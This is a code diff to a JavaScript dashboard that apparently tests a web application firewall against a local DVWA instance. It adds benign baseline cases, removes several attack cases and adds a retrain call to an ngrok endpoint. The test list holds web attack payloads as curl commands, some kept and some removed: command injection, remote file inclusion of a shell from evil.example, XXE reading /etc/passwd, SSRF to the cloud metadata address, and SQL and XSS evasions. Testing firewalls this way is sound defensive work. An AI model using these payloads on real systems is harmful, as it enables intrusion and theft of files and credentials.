@@ -3,9 +3,37 @@ const RED_TEAM_CASES = [
     id: 'safe_baseline',
     title: 'Safe baseline',
     label: 'safe',
+    safe: true,
     code: 0,
     summary: 'Benign smoke test that should pass through the WAF.',
     curl: "curl -i 'http://localhost:8080/index.php'",
+  },
+  {
+    id: 'safe_login_page',
+    title: 'Safe login page',
+    label: 'safe',
+    safe: true,
+    code: 0,
+    summary: 'Plain GET request to the login page with no attack payloads.',
+    curl: "curl -i 'http://localhost:8080/login.php'",
+  },
+  {
+    id: 'safe_setup_page',
+    title: 'Safe setup page',
+    label: 'safe',
+    safe: true,
+    code: 0,
+    summary: 'Benign setup-page request that should be allowed easily.',
+    curl: "curl -i 'http://localhost:8080/setup.php'",
+  },
+  {
+    id: 'safe_robots',
+    title: 'Safe robots file',
+    label: 'safe',
+    safe: true,
+    code: 0,
+    summary: 'Simple static-file style request with no active payload.',
+    curl: "curl -i 'http://localhost:8080/robots.txt'",
   },
   {
     id: 'sqli_classic',
@@ -88,14 +116,6 @@ const RED_TEAM_CASES = [
     curl: "curl -i 'http://localhost:8080/vulnerabilities/exec/?ip=127.0.0.1%26%20sleep%205&Submit=Submit'",
   },
   {
-    id: 'rce',
-    title: 'Remote code execution',
-    label: 'rce',
-    code: 26,
-    summary: 'Command execution payload for RCE-style detection.',
-    curl: "curl -i 'http://localhost:8080/vulnerabilities/exec/?ip=127.0.0.1%3Bpython3%20-c%20%22print%287%2A7%29%22&Submit=Submit'",
-  },
-  {
     id: 'lfi',
     title: 'Local file inclusion',
     label: 'lfi',
@@ -120,14 +140,6 @@ const RED_TEAM_CASES = [
     curl: "curl -i 'http://localhost:8080/vulnerabilities/fi/?page=http://evil.example/shell.txt'",
   },
   {
-    id: 'ssrf',
-    title: 'SSRF',
-    label: 'ssrf',
-    code: 20,
-    summary: 'Metadata-service URL used in SSRF detection examples.',
-    curl: "curl -i 'http://localhost:8080/vulnerabilities/fi/?page=http://169.254.169.254/latest/meta-data/'",
-  },
-  {
     id: 'csrf',
     title: 'CSRF password change',
     label: 'csrf',
@@ -136,68 +148,12 @@ const RED_TEAM_CASES = [
     curl: "curl -i 'http://localhost:8080/vulnerabilities/csrf/?password_new=pwned123&password_conf=pwned123&Change=Change'",
   },
   {
-    id: 'open_redirect',
-    title: 'Open redirect',
-    label: 'open_redirect',
-    code: 22,
-    summary: 'External redirect parameter from the open-redirect dataset family.',
-    curl: "curl -i 'http://localhost:8080/redirect.php?url=http://evil.example/phish'",
-  },
-  {
-    id: 'xxe',
-    title: 'XXE',
-    label: 'xxe',
-    code: 27,
-    summary: 'XML external entity payload for parser exposure checks.',
-    curl: "curl -i -X POST 'http://localhost:8080/vulnerabilities/xxe/' -H 'Content-Type: application/xml' --data '<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>'",
-  },
-  {
-    id: 'ssti',
-    title: 'SSTI',
-    label: 'ssti',
-    code: 13,
-    summary: 'Template expression payload following SSTI dataset rows.',
-    curl: "curl -i 'http://localhost:8080/template/render?name=%7B%7B7%2A7%7D%7D'",
-  },
-  {
-    id: 'evasion_encoding',
-    title: 'Encoded evasion',
-    label: 'evasion_encoding',
-    code: 34,
-    summary: 'Double-encoded script payload for normalization checks.',
-    curl: "curl -i 'http://localhost:8080/vulnerabilities/xss_r/?name=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E&Submit=Submit'",
-  },
-  {
-    id: 'evasion_case_whitespace',
-    title: 'Case whitespace evasion',
-    label: 'evasion_case_whitespace',
-    code: 35,
-    summary: 'Mixed-case SQL keyword spacing pattern from the dataset.',
-    curl: "curl -i 'http://localhost:8080/vulnerabilities/sqli/?id=1%27%20UnIoN%09SeLeCt%201%2Cuser%28%29%2Cdatabase%28%29--&Submit=Submit'",
-  },
-  {
-    id: 'evasion_null_byte',
-    title: 'Null byte evasion',
-    label: 'evasion_null_byte',
-    code: 36,
-    summary: 'Null-byte path payload for parser and decoder checks.',
-    curl: "curl -i 'http://localhost:8080/vulnerabilities/fi/?page=../../../../etc/passwd%00'",
-  },
-  {
-    id: 'http_parameter_pollution',
-    title: 'Parameter pollution',
-    label: 'http_parameter_pollution',
-    code: 37,
-    summary: 'Duplicate parameter payload to test parser edge cases.',
-    curl: "curl -i 'http://localhost:8080/vulnerabilities/sqli/?id=1&id=2&Submit=Submit'",
-  },
-  {
     id: 'brute_force',
     title: 'Brute force',
     label: 'brute_force',
     code: 23,
-    summary: 'Repeated login-style submission for auth/session testing.',
-    curl: "curl -i -X POST 'http://localhost:8080/login.php' -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=admin&password=wrong&Login=Login'",
+    summary: 'DVWA brute-force module login attempt.',
+    curl: "curl -i 'http://localhost:8080/vulnerabilities/brute/?username=admin&password=wrong&Login=Login'",
   },
 ];
 
@@ -215,10 +171,10 @@ function renderRedTeamGrid() {
   if (!grid) return;
 
   grid.innerHTML = RED_TEAM_CASES.map((testCase) => `
-    <article class="redteam-card ${testCase.label === 'safe' ? 'safe' : 'unsafe'}">
+    <article class="redteam-card ${testCase.safe ? 'safe' : 'unsafe'}">
       <div class="redteam-card-head">
         <div>
-          <span class="badge ${testCase.label === 'safe' ? 'safe' : 'blocked'}">${escapeHtml(testCase.label)}</span>
+          <span class="badge ${testCase.safe ? 'safe' : 'blocked'}">${escapeHtml(testCase.label)}</span>
           <h3>${escapeHtml(testCase.title)}</h3>
         </div>
         <span class="code-chip">${testCase.code}</span>
@@ -353,6 +309,39 @@ async function refreshAiHealth() {
   }
 }
 
+async function triggerAiRetrain() {
+  const retrainButton = document.getElementById('trigger-ai-retrain');
+  const refreshButton = document.getElementById('refresh-ai-health');
+  const statusNode = document.getElementById('ai-health-status');
+
+  if (retrainButton) retrainButton.disabled = true;
+  if (refreshButton) refreshButton.disabled = true;
+  if (statusNode) statusNode.textContent = 'Retraining...';
+
+  console.log('POST /retrain -> sending retrain request');
+
+  try {
+    const response = await fetch('https://carded-tartness-caretaker.ngrok-free.dev/retrain', {
+      method: 'POST',
+    });
+
+    if (!response.ok) {
+      throw new Error(`Retrain request failed (${response.status})`);
+    }
+
+    if (statusNode) statusNode.textContent = 'Retrain started';
+    console.log('POST /retrain -> retrain request completed successfully');
+    alert('Retrain request sent successfully.');
+    await refreshAiHealth();
+  } catch (err) {
+    if (statusNode) statusNode.textContent = 'Retrain failed';
+    console.error(err);
+  } finally {
+    if (retrainButton) retrainButton.disabled = false;
+    if (refreshButton) refreshButton.disabled = false;
+  }
+}
+
 function renderHealthValue(value) {
   if (value === null || value === undefined) return 'null';
   return String(value);
@@ -398,8 +387,12 @@ function formatHealthTimestamp(value) {
 function initRedTeamPanel() {
   renderRedTeamGrid();
   const refreshButton = document.getElementById('refresh-ai-health');
+  const retrainButton = document.getElementById('trigger-ai-retrain');
   if (refreshButton) {
-    refreshButton.addEventListener('click', refreshAiHealth);
+    refreshButton.addEventListener('click', triggerAiRetrain);
+  }
+  if (retrainButton) {
+    retrainButton.addEventListener('click', triggerAiRetrain);
   }
   refreshAiHealth();
 }
